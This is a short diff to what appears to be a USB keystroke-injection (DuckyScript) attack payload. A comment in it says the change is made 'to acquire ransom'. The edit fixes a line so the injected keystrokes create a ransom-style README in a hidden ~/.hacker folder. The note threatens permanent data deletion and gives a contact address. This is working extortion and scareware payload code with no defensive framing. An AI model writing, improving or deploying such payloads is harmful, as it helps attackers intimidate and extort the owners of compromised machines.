@@ -229,7 +229,7 @@ REM change message, to acquire ransom
 STRING mkdir ~/.hacker/ && touch ~/.hacker/README.txt
 ENTER
 DELAY 100
-echo I'm Hacker Don't try to ShutDown your system this will permanantly delete your data, contact test@test.com for further details... >> ~/.hacker/README.txt
+STRING echo I'm Hacker Don't try to ShutDown your system this will permanantly delete your data, contact test@test.com for further details... >> ~/.hacker/README.txt
 ENTER
 DELAY 50
 STRING exit
